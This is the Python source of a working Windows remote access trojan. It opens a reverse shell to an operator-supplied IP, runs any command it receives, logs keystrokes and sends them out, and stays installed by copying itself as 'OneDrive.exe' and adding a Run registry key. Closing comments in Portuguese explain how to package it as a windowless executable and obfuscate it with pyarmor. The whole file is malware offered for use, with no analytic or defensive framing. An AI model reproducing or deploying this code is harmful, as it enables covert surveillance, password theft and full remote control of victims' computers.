import os
import shutil
import socket
import subprocess
import sys
import winreg
from datetime import datetime
from time import sleep
from pynput import keyboard

IP = "enter_ip_here"
PORT = 443

PROGRAM_NAME = "OneDrive"
REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
MAX_BUFFER_SIZE = 300

keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None

def format_key(key):
    try:
        return key.char
    except AttributeError:
        special_key = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]\n",
            keyboard.Key.backspace: "[BACKSPACE]\n",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.ctrl: "",
            keyboard.Key.ctrl_r: "",
            keyboard.Key.alt: "",
            keyboard.Key.alt_r: "",
        }
        return special_key.get(key, f"[{str(key).replace('Key.', '').upper()}]")

def on_press(key):
    global keylog_buffer, buffer_auto_send_pending

    formatted = format_key(key)  
    if formatted:  
        keylog_buffer.append(formatted)  

    if len(keylog_buffer) >= MAX_BUFFER_SIZE:  
        buffer_auto_send_pending = True

def get_keylog_data():
    global keylog_buffer

    if not keylog_buffer:  
        return "[i] Keylog buffer is empty"  

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
    data = f"[+] Keylog captured at {timestamp}:\n{''.join(keylog_buffer)}"  
    keylog_buffer = []  

    return data

def start_keylogger():
    global keylogger_active, listener

    if keylogger_active:  
        return "[i] Keylogger is already active"  

    listener = keyboard.Listener(on_press=on_press)  
    listener.start()  
    keylogger_active = True  
    return "[+] Keylogger started"

def stop_keylogger():
    global keylogger_active, listener

    if not keylogger_active:  
        return "[i] Keylogger not running."  

    if listener is not None:  
        listener.stop()  
        listener = None  

    keylogger_active = False  
    return "[+] Keylogger stopped."

def copy_system_file():
    try:
        appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)

        current_file = sys.executable  
        destination = os.path.join(appdata_path, f"{PROGRAM_NAME}.exe")  

        if os.path.abspath(current_file) != os.path.abspath(destination):  
            shutil.copy2(current_file, destination)  
            return destination  
        return current_file  

    except Exception as e:  
        print(f"[-] Error copying file: {e}")  
        return sys.executable

def add_registry_key(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(  
            key,  
            PROGRAM_NAME,  
            0,  
            winreg.REG_SZ,  
            file_path,  
        )  

        winreg.CloseKey(key)  
        return True  

    except Exception:  
        return False

def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH, 0, winreg.KEY_READ
        )

        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)  
        winreg.CloseKey(key)  
        return True  

    except FileNotFoundError:  
        return False  
    except Exception as e:  
        print(f"[-] Persistence check error: {e}")  
        return False

def setup_persistence():
    try:
        if check_persistence():
            return

        persistence_path = copy_system_file()  
        add_registry_key(persistence_path)  

    except Exception as e:  
        print(f"[-] Persistence setup error: {e}")  
        return False

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        c.send("[#] Client connected\n".encode())
        return c
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return None

def listen(c):
    global buffer_auto_send_pending

    try:  
        while True:  
            if buffer_auto_send_pending:  
                data = get_keylog_data()  
                c.send(f"[AUTO-SENDING] {data}\n[AUTO-SENDING]\n".encode())  
                buffer_auto_send_pending = False  

            c.settimeout(0.5)  

            try:  
                raw_data = c.recv(1024)
                if not raw_data:
                    break  
                
                data = raw_data.decode().strip()  

                if data == "/exit":  
                    break  

                cmd(c, data)  

            except socket.timeout:  
                continue  

    except Exception as e:  
        print(f"[!] Listen function error: {e}")  

    finally:  
        c.close()

def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            c.send(b"[i] Directory changed\n")
            return

        elif data == "/persistence status":  
            if check_persistence():  
                c.send(  
                    f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n\n".encode()  
                )  
                return  
            else:  
                c.send(b"[-] Persistence Status: Fail\n\n")  
                return  

        elif data == "/persistence setup":  
            setup_persistence()  
            c.send(b"[+] Done\n\n")  
            return  

        elif data == "/keylog start":  
            response = start_keylogger()  
            c.send(response.encode() + b"\n\n")  
            return  

        elif data == "/keylog stop":  
            response = stop_keylogger()  
            c.send(response.encode() + b"\n\n")  
            return  

        elif data == "/keylog status":  
            status = "Running" if keylogger_active else "Stopped"  
            buffer_size = len(keylog_buffer)  
            response = f"[i] Keylogger Status: {status}\n[i] Buffer: {buffer_size} keys"  
            c.send(response.encode() + b"\n\n")  
            return  

        elif data == "/keylog dump":  
            response = get_keylog_data()  
            c.send(response.encode() + b"\n\n")  
            return  

        else:  
            p = subprocess.Popen(  
                data,  
                shell=True,  
                stdin=subprocess.PIPE,  
                stderr=subprocess.PIPE,  
                stdout=subprocess.PIPE,  
            )  
            output = p.stdout.read() + p.stderr.read()  
            if output:  
                c.send(output + b"\n")  
            else:  
                c.send(b"[+] Command executed\n")  

    except Exception as e:  
        print(f"CMD function error: {e}")

if __name__ == "__main__":
    try:
        setup_persistence()

        while True:  
            client = connect(IP, PORT)  
            if client:  
                listen(client)  
            else:  
                sleep(5)  

    except KeyboardInterrupt:  
        print("[!] Program stopped by the user")  

    except Exception as error:  
        print(f"[!] Main connection error: {error}")

#pip install pyinstaller para instalar o .exe;

#pyinstaller -F --clean -w;

#intale tudo no terminal e nao execute o .exe key;

#ofuscação

#pip install pyarmor

#cd caminho/do/projeto

#pyarmor gen main.py
